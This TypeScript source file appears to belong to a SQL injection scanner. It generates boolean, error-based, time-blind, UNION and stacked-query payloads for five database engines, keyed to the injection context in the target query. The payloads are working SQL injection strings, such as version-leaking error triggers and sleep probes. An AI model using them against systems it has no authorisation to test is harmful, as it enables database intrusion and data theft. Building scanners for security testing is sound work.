// InjectProof — Grammar-based payload generator
// Replaces the static "list of 500 SQLi payloads" with a CFG that produces
// syntactically-valid payloads parameterized by DBMS + inferred context.
// Lists still exist as `payloads.ts`, but they are *seeds* for the generator's
// terminal tokens, not the primary source of test vectors.
//
// The grammar is tiny and deliberately readable — it's a production tool, not
// a research demonstration. Rules below cover SELECT/UNION/ORDER-BY/LIMIT/
// INSERT/UPDATE/boolean/time/stacked/OOB for MySQL, PostgreSQL, MSSQL, Oracle,
// SQLite. Every production ties to an injection *context* so we only emit
// payloads that match the current target's inferred context distribution.

// ============================================================
// Context + DBMS types
// ============================================================

export type DbmsFamily = 'mysql' | 'postgresql' | 'mssql' | 'oracle' | 'sqlite' | 'unknown';

export type InjectionContext =
    | 'where-string-single'     // WHERE col = 'INPUT'
    | 'where-string-double'     // WHERE col = "INPUT"
    | 'where-numeric'           // WHERE col = INPUT
    | 'where-paren-string'      // WHERE func('INPUT')
    | 'where-paren-numeric'     // WHERE func(INPUT)
    | 'where-backtick'          // `INPUT`
    | 'order-by'                // ORDER BY INPUT
    | 'limit'                   // LIMIT INPUT
    | 'insert-string'           // INSERT .. VALUES('INPUT', ..)
    | 'update-string'           // UPDATE .. SET col='INPUT'
    | 'like'                    // LIKE '%INPUT%'
    | 'in-numeric'              // WHERE col IN (INPUT, ..)
    | 'having'                  // HAVING COUNT(INPUT)
    | 'stacked'                 // ; INPUT
    | 'json-string'             // json_path $.INPUT
    | 'rest-path';              // /api/users/INPUT

export interface ContextHint {
    context: InjectionContext;
    /** Probability weight — higher = emit more payloads from this context. */
    weight: number;
}

// Closing characters inferred per context — empty string means "numeric,
// no closer". Used to prepend to the generator's prefix so the payload
// balances the surrounding SQL fragment.
const CLOSERS: Record<InjectionContext, string[]> = {
    'where-string-single': ["'"],
    'where-string-double': ['"'],
    'where-numeric': [''],
    'where-paren-string': ["')", "'))"],
    'where-paren-numeric': [')', '))'],
    'where-backtick': ['`'],
    'order-by': [''],
    'limit': [''],
    'insert-string': ["'"],
    'update-string': ["'"],
    'like': ["%'", "'"],
    'in-numeric': [''],
    'having': [''],
    'stacked': [';'],
    'json-string': ["'"],
    'rest-path': [''],
};

// Comment/line-terminator tokens per DBMS. Used to neutralize the SQL tail
// after our injection so we don't break parsing.
const COMMENT_TOKENS: Record<DbmsFamily, string[]> = {
    mysql: ['-- -', '#', '/*'],
    postgresql: ['-- -', '/*'],
    mssql: ['-- -', '/*'],
    oracle: ['-- -'],
    sqlite: ['-- -', '/*'],
    unknown: ['-- -', '#', '/*'],
};

// Time-delay functions per DBMS — the sole reliable blind oracle when no
// length/content diff is available.
const SLEEP_FUNCS: Record<DbmsFamily, (seconds: number) => string[]> = {
    mysql: (s) => [`SLEEP(${s})`, `BENCHMARK(${s * 1_000_000},SHA1(1))`],
    postgresql: (s) => [`pg_sleep(${s})`],
    mssql: (s) => [`WAITFOR DELAY '0:0:${s}'`],
    oracle: (s) => [`DBMS_PIPE.RECEIVE_MESSAGE(('a'),${s})`],
    sqlite: (s) => [`randomblob(${s * 100000000})`],
    unknown: (s) => [`SLEEP(${s})`, `pg_sleep(${s})`, `WAITFOR DELAY '0:0:${s}'`],
};

// Error-trigger expressions — produce a DBMS-specific error message the
// oracle's `newTokens` signal is sure to catch without us enumerating
// "known error strings."
const ERROR_TRIGGERS: Record<DbmsFamily, string[]> = {
    mysql: ['CONVERT(1,HEX(RAND())-1)', 'EXTRACTVALUE(1,CONCAT(0x5c,(SELECT VERSION())))'],
    postgresql: ['CAST(1/0 AS INT)', '(SELECT 1/0)'],
    mssql: ['CONVERT(INT,(SELECT @@VERSION))', '1/0'],
    oracle: ['UTL_INADDR.GET_HOST_NAME((SELECT SYS.DATABASE_NAME FROM DUAL))'],
    sqlite: ['load_extension(1)'],
    unknown: ['CONVERT(1,HEX(RAND())-1)', 'CAST(1/0 AS INT)'],
};

// Boolean probe pairs — (true-shaped, false-shaped) that the oracle's
// response-distance function differentiates. The pair is sent; the distance
// between responses is the oracle signal.
const BOOLEAN_PAIRS: Array<[string, string]> = [
    ['1=1', '1=2'],
    ['2>1', '1>2'],
    ["'a'='a'", "'a'='b'"],
    ['(SELECT 1)=1', '(SELECT 1)=2'],
];

// ============================================================
// Payload object
// ============================================================

export type PayloadTechnique =
    | 'marker'        // context-triangulation probe only
    | 'boolean-true'
    | 'boolean-false'
    | 'error'
    | 'time-blind'
    | 'union'
    | 'stacked'
    | 'oob';

export interface SqlPayload {
    /** The actual injection string, including closer + comment. */
    value: string;
    technique: PayloadTechnique;
    context: InjectionContext;
    dbms: DbmsFamily;
    /** Paired payload for boolean-pair comparisons, if applicable. */
    pairWith?: string;
    /** Seconds of expected delay for time-blind probes. */
    expectedDelayS?: number;
    /** Human label for provenance logs. */
    label: string;
}

// ============================================================
// Generator — infinite sequence driven by context distribution
// ============================================================

export interface GenerateOptions {
    contexts: ContextHint[];
    dbms: DbmsFamily;
    /** Max payloads per technique before moving on. */
    perTechnique?: number;
    /** Seconds of delay to use in time-based probes. */
    blindDelayS?: number;
    /** Seed corpus: legacy static list can supplement grammar-generated output. */
    seedCorpus?: string[];
}

/**
 * Yield marker probes — short, high-information strings that characterize
 * the server's response to a *suspected* injection context. These are sent
 * first; the oracle's feature deltas on their responses feed into
 * context-infer.ts triangulation.
 */
export function markerPayloads(dbms: DbmsFamily): SqlPayload[] {
    const markers = [
        "'", '"', '`', '\\', "';", "');", "'))", ' ', '(', ')', '--', '/*', '#',
        '%27', '%22', // URL-encoded variants
    ];
    return markers.map((m) => ({
        value: m,
        technique: 'marker' as const,
        context: 'where-string-single',
        dbms,
        label: `marker:${JSON.stringify(m)}`,
    }));
}

/**
 * Generate boolean-pair payloads for a context. Yields one true+false pair
 * per closer + per boolean template.
 */
export function booleanPayloads(context: InjectionContext, dbms: DbmsFamily, limit = 6): SqlPayload[] {
    const closers = CLOSERS[context];
    const comments = COMMENT_TOKENS[dbms];
    const out: SqlPayload[] = [];
    for (const closer of closers) {
        for (const [truish, falsish] of BOOLEAN_PAIRS) {
            for (const comment of comments) {
                if (out.length >= limit) return out;
                const spacer = comment === '/*' ? '/**/' : ' ';
                const suffix = comment === '/*' ? '/*' : comment;
                out.push({
                    value: `${closer} OR ${truish}${spacer}${suffix}`,
                    pairWith: `${closer} AND ${falsish}${spacer}${suffix}`,
                    technique: 'boolean-true',
                    context,
                    dbms,
                    label: `bool:${context}:${truish}`,
                });
            }
        }
    }
    return out;
}

/**
 * Generate error-based payloads: attempt to trigger a DBMS error that the
 * oracle's `newTokens` axis will detect without any hardcoded error-regex.
 */
export function errorPayloads(context: InjectionContext, dbms: DbmsFamily, limit = 4): SqlPayload[] {
    const closers = CLOSERS[context];
    const triggers = ERROR_TRIGGERS[dbms];
    const comments = COMMENT_TOKENS[dbms];
    const out: SqlPayload[] = [];
    for (const closer of closers) {
        for (const trigger of triggers) {
            if (out.length >= limit) return out;
            out.push({
                value: `${closer} AND ${trigger}${comments[0] === '/*' ? '/*' : ' ' + comments[0]}`,
                technique: 'error',
                context,
                dbms,
                label: `error:${context}:${trigger.slice(0, 24)}`,
            });
        }
    }
    return out;
}

/**
 * Time-blind payloads. Delay is configurable so bench runs can keep the
 * target responsive.
 */
export function timePayloads(
    context: InjectionContext,
    dbms: DbmsFamily,
    delayS: number,
    limit = 3,
): SqlPayload[] {
    const closers = CLOSERS[context];
    const sleeps = SLEEP_FUNCS[dbms](delayS);
    const comments = COMMENT_TOKENS[dbms];
    const out: SqlPayload[] = [];
    for (const closer of closers) {
        for (const sleep of sleeps) {
            if (out.length >= limit) return out;
            out.push({
                value: `${closer} AND ${sleep}${comments[0] === '/*' ? '/*' : ' ' + comments[0]}`,
                technique: 'time-blind',
                context,
                dbms,
                expectedDelayS: delayS,
                label: `time:${context}:${sleep.slice(0, 16)}`,
            });
        }
    }
    return out;
}

/**
 * UNION-based payloads. Returns a *sequence* of payloads that probe column
 * count 1..N. Caller runs them through the oracle and picks the first one
 * whose verdict flips to anomalous — that's the column count.
 */
export function unionPayloads(
    context: InjectionContext,
    dbms: DbmsFamily,
    maxColumns = 12,
): SqlPayload[] {
    const closers = CLOSERS[context];
    const comments = COMMENT_TOKENS[dbms];
    const out: SqlPayload[] = [];
    for (const closer of closers) {
        for (let n = 1; n <= maxColumns; n++) {
            const cols = Array.from({ length: n }, () => 'NULL').join(',');
            out.push({
                value: `${closer} UNION SELECT ${cols}${comments[0] === '/*' ? '/*' : ' ' + comments[0]}`,
                technique: 'union',
                context,
                dbms,
                label: `union:cols=${n}`,
            });
        }
    }
    return out;
}

/**
 * Stacked queries probe — only useful when the DB driver allows multiple
 * statements. Time-based confirmation so we're not dependent on side-channel.
 */
export function stackedPayloads(dbms: DbmsFamily, delayS: number, limit = 2): SqlPayload[] {
    const sleeps = SLEEP_FUNCS[dbms](delayS);
    return sleeps.slice(0, limit).map((s) => ({
        value: `; SELECT ${s}; -- -`,
        technique: 'stacked' as const,
        context: 'stacked' as InjectionContext,
        dbms,
        expectedDelayS: delayS,
        label: `stacked:${s.slice(0, 16)}`,
    }));
}

/**
 * Composite generator: yields all payload techniques across the context
 * distribution, weighted by the posterior.
 */
export function generatePayloads(options: GenerateOptions): SqlPayload[] {
    const per = options.perTechnique ?? 6;
    const delay = options.blindDelayS ?? 4;
    const out: SqlPayload[] = [];

    // Marker probes always come first — they are the cheapest and feed
    // context-infer.ts.
    out.push(...markerPayloads(options.dbms));

    // Sort contexts by weight so the most-likely context gets the most
    // payload budget.
    const sortedContexts = [...options.contexts].sort((a, b) => b.weight - a.weight);
    for (const { context } of sortedContexts) {
        out.push(...booleanPayloads(context, options.dbms, per));
        out.push(...errorPayloads(context, options.dbms, Math.ceil(per / 2)));
        out.push(...timePayloads(context, options.dbms, delay, Math.ceil(per / 3)));
        out.push(...unionPayloads(context, options.dbms).slice(0, per * 2));
    }

    // Stacked is DBMS-level, not context-level.
    out.push(...stackedPayloads(options.dbms, delay));

    // Seed corpus — any caller-provided static payloads get tagged and
    // mixed in at the tail so the grammar output remains primary.
    if (options.seedCorpus) {
        for (const seed of options.seedCorpus) {
            out.push({
                value: seed,
                technique: 'boolean-true',
                context: 'where-string-single',
                dbms: options.dbms,
                label: 'seed:' + seed.slice(0, 24),
            });
        }
    }

    return out;
}

// ============================================================
// Helpers exported for tests / callers
// ============================================================

export function closersFor(context: InjectionContext): string[] {
    return [...CLOSERS[context]];
}

export function commentsFor(dbms: DbmsFamily): string[] {
    return [...COMMENT_TOKENS[dbms]];
}
